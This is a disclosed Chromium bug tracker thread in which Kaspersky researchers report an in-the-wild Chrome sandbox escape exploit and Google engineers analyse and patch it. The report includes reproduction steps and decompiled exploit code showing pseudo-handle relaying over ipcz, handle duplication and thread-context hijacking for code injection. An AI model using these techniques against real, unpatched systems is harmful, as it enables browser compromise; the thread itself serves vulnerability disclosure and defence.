# ITW 0-day Google Chrome Sandbox Escape [405143032] - Chromium

| Field | Value |
|-------|-------|
| **Issue ID** | [405143032](https://issues.chromium.org/issues/405143032) |
| **Status** | Unknown |
| **Severity** | Unknown |
| **Priority** | Unknown |
| **Component** | Unknown |
| **Reporter** | Unknown |
| **Bounty** | Confirmed (amount unknown) |

## Description

# Steps to reproduce the problem

We were able to successfully test the sandbox escape exploit on Chrome without need for RCE. This is how we did it:

1. Launched Chrome (134.0.6998.89) without any special flags
2. Launched JS with a call to alert(), some builtin function and exploit trigger:
   var ab = new ArrayBuffer(8);
   var ar = new Int32Array(ab);
   ar[0] = 0xcccccccc;
   console.debug(0x42, ar);
3. Attached with debugger to renderer process on alert() function call.
4. Loaded and executed DLL of exploit with custom shellcode
5. Continued execution
6. Verified successful code injection from renderer process

In the archive you can also find shellcode that runs DLL from memory and my script.
The password for archive: infected.

# Problem Description

Hello team,

We were able to catch a 0-day Google Chrome sandbox escape exploit that was recently used in a wave of targeted attacks as a part of 1-click attack chain. Unfortunately, we were unable to obtain the RCE part of the attack chain yet, but our investigation is still ongoing. We were able to successfully test the sandbox escape exploit on 134.0.6998.89.
You can find a sample of an exploit in the attachment – it’s a DLL file. The exploitation is done using the ipcz interface and the exploit is built on the open source code of mojo framework. We did a quick analysis and here's a quick explanation of what it does:
Once DLL is loaded into memory, it executes function 0x18001ED90, which initializes the exploit - parses the structure of the chrome.dll library and determines the addresses of useful functions and code gadgets using a pattern search. After that it installs a hook on the function “v8\_inspector::V8Console::Debug(v8::debug::ConsoleCallArguments const&, v8::debug::ConsoleContext const&)” that allows to execute sandbox escape with the desired payload with a call from the JS.
Once exploit is initialized attackers can trigger sandbox escape with “console.debug(0x42, shellcode);”.
Most of ipcz/mojo work is done in function 0x18001EE10. Here's some quickly reverse engineered code of it:

```
  // Get node
  sub_18002C0C0(node_object, &node_link_object);
  ipcz::Node::GetAssignedName__(node_object, &v20);

  // Hook "ipcz::NodeLink::OnAcceptRelayedMessage(ipcz::msg::AcceptRelayedMessage&)" function
  v7 = *(_QWORD *)node_link_object + 264i64;
  OnAcceptRelayedMessage_func_ptr = v7;
  v7 &= 0xFFFFFFFFFFFFF000ui64;
  VirtualProtect((LPVOID)v7, 0x1000ui64, 4u, &flOldProtect);
  OnAcceptRelayedMessage_original = *(__int64 (__fastcall **)(_QWORD, _QWORD))OnAcceptRelayedMessage_func_ptr;
  *(_QWORD *)OnAcceptRelayedMessage_func_ptr = OnAcceptRelayedMessage_hook;
  VirtualProtect((LPVOID)v7, 0x1000ui64, flOldProtect, &flOldProtect);

  // Send RelayMessage with unknown message_id (0x69)
  LODWORD(v7) = GetLastError();
  v17 = -2i64;
  base__GetProgramCounter__();
  SetLastError(v7);
  mojo::PlatformHandle::PlatformHandle_base::win::GenericScopedHandle_base::win::HandleTraits_base::win::DummyVerifierTraits__(
    (__int64)&v18, &v17);
  v8 = (_QWORD *)operator_new_unsigned_long_long_(32i64);
  mojo::PlatformHandle::operator__mojo::PlatformHandle___((__int64)v23, (__int64)&v18);
  mojo::core::ipcz_driver::WrappedPlatformHandle::WrappedPlatformHandle_mojo::PlatformHandle_(v8, (__int64)v23);
  LOBYTE(v9) = 0xAA;
  memset(v23, v9, sizeof(v23));
  ipcz::Message::Message_unsigned_char__unsigned_long_long_(v23, 0x69, 0x10i64);
  v10 = v23[21];
  v11 = *(unsigned __int8 *)v23[21];
  *(_QWORD *)(v23[21] + v11) = 0xDEADBEEF12345678ui64;
  *(_QWORD *)(v10 + v11 + 8) = 0i64;
  DriverObject(&v16, *(_QWORD *)(node_object + 24), (__int64)v8);
  TakeDriverObject__(driver_object, (__int64 *)&v16);
  ipcz::Message::AppendDriverObject_ipcz::DriverObject_((__int64)v23, (__int64)driver_object);
  ipcz::NodeLink::RelayMessage_ipcz::NodeName_const___ipcz::Message__((__int64)node_link_object, &v20, (__int64)v23);
```

Once RelayMessage is sent, the handler of attackers (function 0x18001E350) gets executed. This handler looks for messages with message\_id equal to 0x69. When such message is received it reads pointer to WrappedPlatformHandle object from message+0xC8, gets a Windows OS HANDLE from it and calls a DuplicateHandle API function on it.

```
  v15 = GetCurrentProcess();
  v16 = GetCurrentProcess();
  if ( DuplicateHandle(v16, from_message, v15, &TargetHandle, 0x101FFFFFu, 0, DUPLICATE_SAME_ACCESS) )
```

If this operation succeeds exploit removes OnAcceptRelayedMessage hook and executes a thread that performs a code injection using duplicated handle.

This thread (function 0x18001D5F0) adjusts the priority of current and remote threads (using duplicated handle) and executes code in a remote process using the gadget addresses resolved at the initial stage. These gadgets are executed by manipulation of a remote thread context with a series of calls to API functions GetThreadContext, SetThreadContext, ResumeThread, SuspendThread.

```
    memset(&Context, 0, sizeof(Context));
    Context.ContextFlags = 0x10001F;
    if ( GetThreadContext(v3, &Context) )
    {
      memcpy(&v58, &Context, sizeof(v58));
      Context.ContextFlags = 0x10001F;
      stack_pos = Context.Rsp - 256;
      Context.Rdi = Context.Rsp - 296;
      Context.R14 = code_gadget_end_address_EBFE;
      Context.Rip = code_gadget_start_address1;
      Context.Rbx = code_gadget_end_address_EBFE;
      Context.Rsp -= 256i64;
      Context.Rbp = Context.Rsp;
      SetThreadContext(v3, &Context);
      v4 = code_gadget_end_address_EBFE;
      do
      {
        ResumeThread(v3);
        SuspendThread(v3);
        GetThreadContext(v3, &Context);
      }
      while ( Context.Rip != v4 );
```

After it exploit injects shellcode with WriteProcessMemory+CreateRemoteThread

# Summary

ITW 0-day Google Chrome Sandbox Escape

# Custom Questions

#### Reporter credit:

Boris Larin (@oct0xor) and Igor Kuznetsov (@2igosha) of Kaspersky

# Additional Data

Category: Security   
Chrome Channel: Stable   
Regression: N/A

## Timeline

### wf...@chromium.org (2025-03-20)

Acknowledging receipt of your report. Thank you.

It's not clear from the description and code snippets in your report how a sandbox escape is happening here, are they using a particular mojo ipc to do this? It seems this capability you describe might allow them to load code inside the renderer, but for this to be a sandbox escape they would have to be manipulating the browser process.

I will try and perform more analysis shortly.

### wf...@chromium.org (2025-03-20)

I've consulted with some colleagues and they are able to reproduce this. It's not clear yet exactly where the bug in the browser is though. Perhaps running with some kind of dynamic instrumentation on the browser might help here, or you could try `--enable-features=BrowserDynamicCodeDisabled` to try and see if it triggers a `__fastfail` in the browser that can be caught it in the debugger?

In the meantime I will continue to take a look at this issue and loop people in as needed.

### am...@chromium.org (2025-03-20)

redacted

### am...@chromium.org (2025-03-20)

Removing the original archive, contents are now restricted to Google; removing `Security Embargo` accordingly

### aj...@google.com (2025-03-20)

It looks like handles are being relayed back to the renderer - usually these cannot be duplicated but the special values INVALID_HANDLE_VALUE and -2 represent 'current process' and 'current thread'. We should be blocking these.

adding that check for -2 here is a good thing https://source.chromium.org/chromium/chromium/src/+/main:mojo/core/platform_handle_in_transit.cc;l=41
also need it here https://source.chromium.org/chromium/chromium/src/+/main:mojo/core/ipcz_driver/transport.cc;l=141


### aj...@google.com (2025-03-21)

Proposed fix: getting reviewed now  https://chromium-review.googlesource.com/c/chromium/src/+/6380193

I've not been able to get death tests working, but I have tests that pass[0] before the fix, but crash [1] correctly after -  these will not be committed but I'll work on trying to get something we can commit.

[0] https://chromium-review.googlesource.com/c/chromium/src/+/6380213
[1] https://chromium-review.googlesource.com/c/chromium/src/+/6380233

### dx...@google.com (2025-03-21)

Project: chromium/src  
Branch: main  
Author: Alex Gough [ajgo@chromium.org](mailto:ajgo@chromium.org)  
Link:      <https://chromium-review.googlesource.com/6380193>

Avoid receiving or sending sentinel handle values

---


Expand for full commit details

```
    These values can be misinterpreted by OS functions, so 
    avoid sending or receiving them over IPCZ. 
     
    Bug: 405143032 
    Change-Id: Ib578fb4727e78e2697c60c42005daa97e08695e9 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6380193 
    Reviewed-by: Will Harris <wfh@chromium.org> 
    Commit-Queue: Alex Gough <ajgo@chromium.org> 
    Reviewed-by: Daniel Cheng <dcheng@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1436135}
```

---

Files:

- M `base/win/win_util.h`
- M `base/win/win_util_unittest.cc`
- M `mojo/core/ipcz_driver/transport.cc`
- M `mojo/core/platform_handle_in_transit.cc`
- M `mojo/public/cpp/platform/platform_handle.h`

---

Hash: 36dbbf38697dd1e23ef8944bb9e57f6e0b3d41ec  
Date:  Fri Mar 21 17:32:49 2025



---

### aj...@google.com (2025-03-21)

Testing on a local official build of the CL in comment 8 breaks the exploit in the renderer as they call `SerializeObject()` so we cannot test it directly in the browser.

```
7:120> k
 # Child-SP          RetAddr               Call Site
00 (Inline Function) --------`--------     chrome!base::ImmediateCrash [D:\chromium\src\base\immediate_crash.h @ 186] 
01 (Inline Function) --------`--------     chrome!logging::CheckFailure [D:\chromium\src\base\check.h @ 253] 
02 (Inline Function) --------`--------     chrome!mojo::core::ipcz_driver::`anonymous namespace'::EncodeHandle+0x21a [D:\chromium\src\mojo\core\ipcz_driver\transport.cc @ 143] 
03 (Inline Function) --------`--------     chrome!mojo::core::ipcz_driver::Transport::SerializeObject+0x524 [D:\chromium\src\mojo\core\ipcz_driver\transport.cc @ 484] 
04 00000019`e87fec70 00000001`8008b1f4     chrome!mojo::core::ipcz_driver::`anonymous namespace'::Serialize+0x5b7 [D:\chromium\src\mojo\core\ipcz_driver\driver.cc @ 63] 
05 00000019`e87fed70 00000001`8008ccec     0x00000001`8008b1f4
06 00000019`e87fede0 00000001`8008b4b7     0x00000001`8008ccec
07 00000019`e87fef20 00000001`80032f76     0x00000001`8008b4b7
08 00000019`e87fef70 00000001`8001f08d     0x00000001`80032f76
09 00000019`e87ff0e0 00007ffa`4b554398     0x00000001`8001f08d
0a (Inline Function) --------`--------     chrome!base::OnceCallback<void ()>::Run+0x32 [D:\chromium\src\base\functional\callback.h @ 156] 
0b (Inline Function) --------`--------     chrome!base::TaskAnnotator::RunTaskImpl+0x120 [D:\chromium\src\base\task\common\task_annotator.cc @ 209] 
0c (Inline Function) --------`--------     chrome!base::TaskAnnotator::RunTask+0x16f [D:\chromium\src\base\task\common\task_annotator.h @ 106] 
0d (Inline Function) --------`--------     chrome!base::internal::TaskTracker::RunTaskImpl+0x188 [D:\chromium\src\base\task\thread_pool\task_tracker.cc @ 691] 
0e 00000019`e87ff2d0 00007ffa`4b552c9a     chrome!base::internal::TaskTracker::RunSkipOnShutdown+0x1d8 [D:\chromium\src\base\task\thread_pool\task_tracker.cc @ 676] 
0f (Inline Function) --------`--------     chrome!base::internal::TaskTracker::RunTaskWithShutdownBehavior+0x18e [D:\chromium\src\base\task\thread_pool\task_tracker.cc @ 706] 
10 (Inline Function) --------`--------     chrome!base::internal::TaskTracker::RunTask+0x466 [D:\chromium\src\base\task\thread_pool\task_tracker.cc @ 504] 
11 00000019`e87ff3f0 00007ffa`4b5508d8     chrome!base::internal::TaskTracker::RunAndPopNextTask+0x9da [D:\chromium\src\base\task\thread_pool\task_tracker.cc @ 394] 
12 00000019`e87ff750 00007ffa`48658e68     chrome!base::internal::WorkerThread::RunWorker+0x668 [D:\chromium\src\base\task\thread_pool\worker_thread.cc @ 473] 
13 00000019`e87ff950 00007ffa`48f0f9d0     chrome!base::internal::WorkerThread::RunSharedWorker+0x18 [D:\chromium\src\base\task\thread_pool\worker_thread.cc @ 369] 
14 00000019`e87ff990 00007ffa`de74259d     chrome!base::`anonymous namespace'::ThreadFunc+0x1a0 [D:\chromium\src\base\threading\platform_thread_win.cc @ 107] 
15 00000019`e87ffa40 00007ffa`dfccaf38     KERNEL32!BaseThreadInitThunk+0x1d
16 00000019`e87ffa70 00000000`00000000     ntdll!RtlUserThreadStart+0x28
```


### wf...@chromium.org (2025-03-21)

Great, but I presume the same check also now exists in the browser (and would break it there) otherwise an malicious handle could just be manually serialized into the mojo buffer from the renderer?

### dx...@google.com (2025-03-21)

Project: chromium/src  
Branch: refs/branch-heads/7082  
Author: Alex Gough [ajgo@chromium.org](mailto:ajgo@chromium.org)  
Link:      <https://chromium-review.googlesource.com/6383337>

Avoid receiving or sending sentinel handle values

---


Expand for full commit details

```
    These values can be misinterpreted by OS functions, so 
    avoid sending or receiving them over IPCZ. 
     
    Bug: 405143032 
    Change-Id: Ib578fb4727e78e2697c60c42005daa97e08695e9 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6383337 
    Reviewed-by: Will Harris <wfh@chromium.org> 
    Commit-Queue: Alex Gough <ajgo@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7082@{#4} 
    Cr-Branched-From: cd30077dafb4b107c205b960c0d1226ae82c27bf-refs/heads/main@{#1435959}
```

---

Files:

- M `base/win/win_util.h`
- M `base/win/win_util_unittest.cc`
- M `mojo/core/ipcz_driver/transport.cc`
- M `mojo/core/platform_handle_in_transit.cc`
- M `mojo/public/cpp/platform/platform_handle.h`

---

Hash: 137cd36c893933a38d0630af3cdc2ff4d77ed659  
Date:  Fri Mar 21 17:59:01 2025



---

### aj...@google.com (2025-03-21)

RE comment 10 yes the decode has a check too - my comment was more about validating the fix against the reported exploit.

### aj...@google.com (2025-03-21)

Marking as Fixed as we believe that the CL in comment 8 is sufficient.

### ch...@google.com (2025-03-21)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### aj...@google.com (2025-03-21)

If I skip the encode check in the renderer[0] and recompile I have confirmed that the exploit is caught by the CHECK in the decode function in the browser.

[0]
```
  // XXX skip test in renderer
  if (!base::CommandLine::ForCurrentProcess()->HasSwitch("type")) {
    CHECK(!handle.is_pseudo_handle());
  }
```

```
0:024> k
 # Child-SP          RetAddr               Call Site
00 (Inline Function) --------`--------     chrome!base::ImmediateCrash [D:\chromium\src\base\immediate_crash.h @ 186] 
01 (Inline Function) --------`--------     chrome!logging::CheckFailure [D:\chromium\src\base\check.h @ 253] 
02 (Inline Function) --------`--------     chrome!mojo::core::ipcz_driver::`anonymous namespace'::DecodeHandle+0x82d [D:\chromium\src\mojo\core\ipcz_driver\transport.cc @ 190] 
03 000000f3`4b1fed50 00007ffa`4b95ac8e     chrome!mojo::core::ipcz_driver::Transport::DeserializeObject+0xada [D:\chromium\src\mojo\core\ipcz_driver\transport.cc @ 540] 
04 (Inline Function) --------`--------     chrome!mojo::core::ipcz_driver::`anonymous namespace'::Deserialize+0x5e [D:\chromium\src\mojo\core\ipcz_driver\driver.cc @ 90] 
05 (Inline Function) --------`--------     chrome!ipcz::DriverObject::Deserialize+0x94 [D:\chromium\src\third_party\ipcz\src\ipcz\driver_object.cc @ 111] 
06 (Inline Function) --------`--------     chrome!ipcz::`anonymous namespace'::DeserializeDriverObject+0x132 [D:\chromium\src\third_party\ipcz\src\ipcz\message.cc @ 139] 
07 (Inline Function) --------`--------     chrome!ipcz::Message::DeserializeUnknownType+0x618 [D:\chromium\src\third_party\ipcz\src\ipcz\message.cc @ 316] 
08 000000f3`4b1feef0 00007ffa`4b95956c     chrome!ipcz::Message::DeserializeFromTransport+0x64e [D:\chromium\src\third_party\ipcz\src\ipcz\message.cc @ 494] 
09 (Inline Function) --------`--------     chrome!absl::Span<const ipcz::internal::VersionMetadata>::Span+0x2f [D:\chromium\src\third_party\abseil-cpp\absl\types\span.h @ 224] 
0a (Inline Function) --------`--------     chrome!absl::MakeSpan+0x2f [D:\chromium\src\third_party\abseil-cpp\absl\types\span.h @ 745] 
0b (Inline Function) --------`--------     chrome!ipcz::msg::RelayMessage::Deserialize+0x2f [D:\chromium\src\third_party\ipcz\src\ipcz\node_messages_generator.h @ 687] 
0c 000000f3`4b1ff020 00007ffa`4b83dd41     chrome!ipcz::msg::NodeMessageListener::OnTransportMessage+0x9dc [D:\chromium\src\third_party\ipcz\src\ipcz\node_messages_generator.h @ 687] 
0d (Inline Function) --------`--------     chrome!ipcz::DriverTransport::Notify+0x26 [D:\chromium\src\third_party\ipcz\src\ipcz\driver_transport.cc @ 129] 
0e (Inline Function) --------`--------     chrome!ipcz::`anonymous namespace'::NotifyTransport+0x55 [D:\chromium\src\third_party\ipcz\src\ipcz\driver_transport.cc @ 47] 
0f (Inline Function) --------`--------     chrome!mojo::core::ipcz_driver::Transport::OnChannelMessage+0x97 [D:\chromium\src\mojo\core\ipcz_driver\transport.cc @ 691] 
10 (Inline Function) --------`--------     chrome!mojo::core::Channel::TryDispatchMessage+0x1a7 [D:\chromium\src\mojo\core\channel.cc @ 1026] 

```

### aj...@google.com (2025-03-21)

Thanks Boris & Igor - the initial analysis here helped us make quick progress!

### am...@chromium.org (2025-03-21)

+1 to c#16 and thank you for report.
I'm sure y'all are working on it still, but I wanted to check in to see if y'all have had any luck identifying the renderer RCE part of the chain?

### oc...@gmail.com (2025-03-21)

Wow, thanks for fixing it so quickly! Unfortunately, since the initial report we have not seen any new waves of attacks; it seems that the attackers are taking a break :( When are you planning to publish a fix?

### am...@chromium.org (2025-03-21)

Thanks for the insight here.
Right now, barring any issues and given the fix itself, we're planning on releasing an update with this fix on Tuesday.

### am...@chromium.org (2025-03-24)

merges approved for <https://crrev.com/c/6380193>; Canary data still looks good, please go ahead and merge to Stable M134 branch 6998 at soonest so the release team can cut RC later this morning for QA, with release tomorrow

### dx...@google.com (2025-03-24)

Project: chromium/src  
Branch: refs/branch-heads/6998  
Author: Alex Gough [ajgo@chromium.org](mailto:ajgo@chromium.org)  
Link:      <https://chromium-review.googlesource.com/6383569>

Avoid receiving or sending sentinel handle values

---


Expand for full commit details

```
    These values can be misinterpreted by OS functions, so 
    avoid sending or receiving them over IPCZ. 
     
    (cherry picked from commit 36dbbf38697dd1e23ef8944bb9e57f6e0b3d41ec) 
     
    Bug: 405143032 
    Change-Id: Ib578fb4727e78e2697c60c42005daa97e08695e9 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6380193 
    Reviewed-by: Will Harris <wfh@chromium.org> 
    Commit-Queue: Alex Gough <ajgo@chromium.org> 
    Reviewed-by: Daniel Cheng <dcheng@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1436135} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6383569 
    Owners-Override: Srinivas Sista <srinivassista@chromium.org> 
    Commit-Queue: Srinivas Sista <srinivassista@chromium.org> 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Cr-Commit-Position: refs/branch-heads/6998@{#2315} 
    Cr-Branched-From: de9c6fafd8ae5c6ea0438764076ca7d04a0b165d-refs/heads/main@{#1415337}
```

---

Files:

- M `base/win/win_util.h`
- M `base/win/win_util_unittest.cc`
- M `mojo/core/ipcz_driver/transport.cc`
- M `mojo/core/platform_handle_in_transit.cc`
- M `mojo/public/cpp/platform/platform_handle.h`

---

Hash: b8f80176b1636154c6bfc85a607b05cc3aec50cb  
Date:  Mon Mar 24 16:04:37 2025



---

### dx...@google.com (2025-03-24)

Project: chromium/src  
Branch: refs/branch-heads/7049  
Author: Alex Gough [ajgo@chromium.org](mailto:ajgo@chromium.org)  
Link:      <https://chromium-review.googlesource.com/6383570>

Avoid receiving or sending sentinel handle values

---


Expand for full commit details

```
    These values can be misinterpreted by OS functions, so 
    avoid sending or receiving them over IPCZ. 
     
    (cherry picked from commit 36dbbf38697dd1e23ef8944bb9e57f6e0b3d41ec) 
     
    Bug: 405143032 
    Change-Id: Ib578fb4727e78e2697c60c42005daa97e08695e9 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6380193 
    Reviewed-by: Will Harris <wfh@chromium.org> 
    Commit-Queue: Alex Gough <ajgo@chromium.org> 
    Reviewed-by: Daniel Cheng <dcheng@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1436135} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6383570 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Owners-Override: Srinivas Sista <srinivassista@chromium.org> 
    Commit-Queue: Srinivas Sista <srinivassista@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7049@{#1265} 
    Cr-Branched-From: 2dab7846d0951a552bdc4f350dad497f986e6fed-refs/heads/main@{#1427262}
```

---

Files:

- M `base/win/win_util.h`
- M `base/win/win_util_unittest.cc`
- M `mojo/core/ipcz_driver/transport.cc`
- M `mojo/core/platform_handle_in_transit.cc`
- M `mojo/public/cpp/platform/platform_handle.h`

---

Hash: 61788ee7045bc5aa467546fa4ff296c18a19d5f3  
Date:  Mon Mar 24 16:08:53 2025



---

### am...@chromium.org (2025-03-26)

We sincerely appreciate you reporting this to us and providing the analysis and details that you provided to us that allowed us to swiftly investigate and ship a fix to protect people using Chrome.
Unfortunately, the US government enacted sanctions against Russia in November of 2024, the impact of which means we are legally not able to process a payment to people living in Russia or Belarus.

If your residency has changed since your last report to us, please let us know and reach out to p2p-vrp@ to ensure your account information can be updated.
If this is still the case, however, we are unfortunately unable to issue a reward for this report.

### oc...@gmail.com (2025-03-28)

Thank you for releasing the update so fast! 

I am aware of the payment restrictions, I want 100% of the reward to be awarded to my teammate who does not live in Russia or Belarus and also worked on this case. I've discussed this with p2p-vrp@ and they are waiting for the reward information to be synced with their system.


### am...@chromium.org (2025-03-28)

To ensure this can take place (our entire side of getting payments info to p2p-vrp or bugcrowd is fully automated) and appropriately so, we'll need your teammates email address to replace your as the reporter of this issue. We'll also need to bring it to VRP panel for reward assessment within the next couple of weeks.
We did not make a reward decision here since it was a no-op for us based on the information at hand.

Please provide the email address we are to use so that we can take that into consideration.
Also, please ask p2p-vrp to cc me on that case because I will need visibility to that as we move forward.

### oc...@gmail.com (2025-03-28)

No problem, please use this email -> s...

### am...@chromium.org (2025-03-28)

Thank you for the quick response. I've updated the reporter field. I'm going to delete you comment now so the full version of the email isn't visible when the bug is disclosed in about 13 weeks. :)

### am...@chromium.org (2025-04-01)

Hello Boris, after consulting with our legal team it has been conveyed that when we are unable to issue a VRP reward due to the legalities of sanctions, we are also not allowed to redirect or donate those funds to a person or entity at the request of the person or entity restricted by sanctions.
We'll unfortunately need to decline a VRP reward here and we will not be able to issue that to another person on your behalf.

### oc...@gmail.com (2025-04-01)

Understood. It's unfair to Mr. S, but we found and reported this not for the sake of a reward :)

Kind regards,
Boris


### am...@chromium.org (2025-04-02)

We do appreciate all the work that went into analysis and reporting this issue to us. Thank you. And thank you for your understanding.

### dx...@google.com (2025-05-08)

Project: chromium/src  
Branch: main  
Author: Will Harris [wfh@chromium.org](mailto:wfh@chromium.org)  
Link:      <https://chromium-review.googlesource.com/6379023>

Add handle type allowlist for transfer to untrusted process

---


Expand for full commit details

```
    This CL adds a new allowlist for types of handles that can be 
    transferred to an untrusted process. 
     
    The allowlist has been determined empirically and is: 
     
    Section 
    File 
    Directory 
    DxgkSharedResource 
     
    A default-enabled feature is emplaced to control this new protection 
    called MojoHandleTypeProtections, in case of any issues. 
     
    A test is added to verify that a NOTREACHED occurs when attempting to 
    transfer this type of handle. 
     
    BUG=405143032 
     
    Change-Id: I6f0fa6887beb1766cf19fdf0d19ee3487dd160a4 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6379023 
    Reviewed-by: Alex Gough <ajgo@chromium.org> 
    Commit-Queue: Will Harris <wfh@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1457709}
```

---

Files:

- M `mojo/core/embedder/features.cc`
- M `mojo/core/embedder/features.h`
- M `mojo/core/ipcz_driver/transport.cc`
- M `mojo/core/ipcz_driver/transport_test.cc`
- M `mojo/core/platform_handle_in_transit.cc`
- M `mojo/public/cpp/platform/platform_handle_security_util_win.cc`
- M `mojo/public/cpp/platform/platform_handle_security_util_win.h`

---

Hash: 3cb6f6c2e3de7eb17fdde9d3bd4637038f5de479  
Date:  Thu May 8 17:52:35 2025



---

### ch...@google.com (2025-06-28)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### 17...@gmail.com (2026-01-13)

Can I verify this vulnerability? Could you send me the poc or exp?

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/405143032)*
